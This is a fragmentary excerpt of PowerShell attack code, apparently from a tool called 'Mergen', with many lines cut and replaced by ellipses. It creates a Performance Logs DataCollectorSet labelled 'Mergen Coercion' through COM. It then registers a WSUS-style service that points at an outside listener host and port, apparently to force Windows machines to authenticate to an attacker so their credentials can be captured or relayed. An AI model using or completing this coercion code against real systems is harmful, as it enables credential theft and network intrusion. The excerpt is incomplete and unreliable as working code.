...
<description>Mergen</description>
...
<DataCollectorSet>
    ...
    <Description>Mergen Coercion</Description>
</DataCollectorSet>
"@

    $dcom.SetXml($xml)
    $dcom.Commit("Mergen", $null, 0x0003) | Out-Null
...
try {
    ...
    try {
        ...
        $manager.AddService2("Mergen", 2, "https://${listener}:${port}/wsus")
